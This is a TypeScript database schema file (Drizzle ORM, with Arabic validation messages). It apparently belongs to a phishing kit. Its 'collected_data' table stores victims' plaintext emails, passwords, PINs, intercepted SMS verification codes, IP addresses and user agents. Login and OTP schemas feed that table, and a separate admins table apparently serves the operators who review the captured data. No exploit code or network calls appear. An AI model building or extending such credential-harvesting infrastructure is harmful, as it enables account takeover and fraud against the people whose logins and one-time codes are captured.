import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  email: text("email").notNull().unique(),
  password: text("password").notNull(),
  pin: text("pin").notNull(),
  phone: text("phone").notNull(),
  isVerified: boolean("is_verified").notNull().default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const collectedData = pgTable("collected_data", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  email: text("email").notNull(),
  password: text("password").notNull(),
  pin: text("pin").notNull(),
  smsCode: text("sms_code"),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  verifiedAt: timestamp("verified_at"),
});

export const admins = pgTable("admins", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  role: text("role").notNull().default("staff"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertUserSchema = createInsertSchema(users).omit({
  id: true,
  isVerified: true,
  createdAt: true,
});

export const insertCollectedDataSchema = createInsertSchema(collectedData).omit({
  id: true,
  createdAt: true,
  verifiedAt: true,
});

export const loginSchema = z.object({
  email: z.string().min(1, "البريد الإلكتروني مطلوب"),
  password: z.string().min(1, "كلمة المرور مطلوبة"),
  pin: z.string().min(1, "رمز PIN مطلوب"),
});

export const verifyOtpSchema = z.object({
  userId: z.string(),
  otp: z.string().min(4, "رمز التحقق مطلوب").max(8, "رمز التحقق طويل جداً"),
});

export const adminLoginSchema = z.object({
  username: z.string().min(1, "اسم المستخدم مطلوب"),
  password: z.string().min(1, "كلمة المرور مطلوبة"),
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type CollectedData = typeof collectedData.$inferSelect;
export type InsertCollectedData = z.infer<typeof insertCollectedDataSchema>;
export type Admin = typeof admins.$inferSelect;
export type LoginData = z.infer<typeof loginSchema>;
export type VerifyOtpData = z.infer<typeof verifyOtpSchema>;
export type AdminLoginData = z.infer<typeof adminLoginSchema>;
